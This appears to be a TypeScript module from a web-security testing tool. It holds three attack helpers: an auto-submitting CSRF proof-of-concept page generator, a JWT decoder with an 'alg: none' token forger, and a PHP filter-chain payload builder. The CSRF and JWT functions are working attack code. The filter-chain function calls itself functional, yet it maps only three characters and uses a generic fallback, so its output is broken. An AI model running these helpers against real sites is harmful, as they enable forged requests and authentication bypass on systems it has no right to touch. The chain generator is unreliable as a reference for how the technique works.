
/**
 * CSRF Generator Logic
 */
export const generateCSRFPoC = (rawRequest: string, autoSubmit: boolean) => {
  const parts = rawRequest.split('\n\n');
  const headersPart = parts[0];
  const bodyPart = parts[1] || '';

  const headerLines = headersPart.split('\n');
  const firstLine = headerLines[0].split(' ');
  const method = firstLine[0] || 'POST';
  const path = firstLine[1] || '/';

  const hostHeader = headerLines.find(l => l.toLowerCase().startsWith('host: '));
  const host = hostHeader ? hostHeader.split(': ')[1].trim() : 'localhost';

  let params: { [key: string]: string } = {};

  // Simplistic body parsing
  if (bodyPart.includes('=') && !bodyPart.trim().startsWith('{')) {
    // Form encoded
    bodyPart.split('&').forEach(p => {
      const [k, v] = p.split('=');
      if (k) params[decodeURIComponent(k)] = decodeURIComponent(v || '');
    });
  } else if (bodyPart.trim().startsWith('{')) {
    // JSON attempt
    try {
      const parsed = JSON.parse(bodyPart);
      Object.keys(parsed).forEach(k => params[k] = JSON.stringify(parsed[k]));
    } catch (e) {
      console.error("JSON parse failed for body");
    }
  }

  const inputs = Object.entries(params)
    .map(([k, v]) => `    <input type="hidden" name="${k}" value='${v.replace(/'/g, "&#39;")}' />`)
    .join('\n');

  return `<html>
  <body onload="${autoSubmit ? 'document.forms[0].submit()' : ''}">
    <form action="http://${host}${path}" method="${method}">
${inputs}
      <input type="submit" value="Submit Request" />
    </form>
    ${autoSubmit ? '<script>document.forms[0].submit();</script>' : ''}
  </body>
</html>`;
};

/**
 * JWT Tool Logic
 */
export const decodeJWT = (token: string) => {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return null;
    return {
      header: JSON.parse(atob(parts[0])),
      payload: JSON.parse(atob(parts[1])),
      signature: parts[2] || ''
    };
  } catch (e) {
    return null;
  }
};

export const createNoneAttack = (token: string) => {
  try {
    const parts = token.split('.');
    const header = JSON.parse(atob(parts[0]));
    header.alg = 'none';
    const newHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    return `${newHeader}.${parts[1]}.`;
  } catch (e) {
    return "Invalid token";
  }
};

/**
 * PHP Filter Chain Logic (Sample subset for brevity, but functional)
 */
export const generatePHPFilterChain = (payload: string) => {
  const b64 = btoa(payload).replace(/=/g, '');
  const oracle: Record<string, string> = {
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.ISO10646-1.UCS-2',
    'B': 'convert.iconv.ISO8859-1.UTF-16BE|convert.iconv.ISO-10646-UCS-4',
    'C': 'convert.iconv.IBM866.UTF-16|convert.iconv.ISO-10646-UCS-4',
    // ... in a full app we would have the full alphabet mapping
  };
  
  // Minimal placeholder implementation for large chains
  let chain = 'php://filter/read=convert.base64-encode';
  for (let i = b64.length - 1; i >= 0; i--) {
    const char = b64[i];
    const filter = oracle[char] || 'convert.iconv.UTF8.UTF7'; // Fallback
    chain += `|${filter}|convert.base64-decode|convert.base64-encode`;
  }
  return chain + '/resource=php://temp';
};
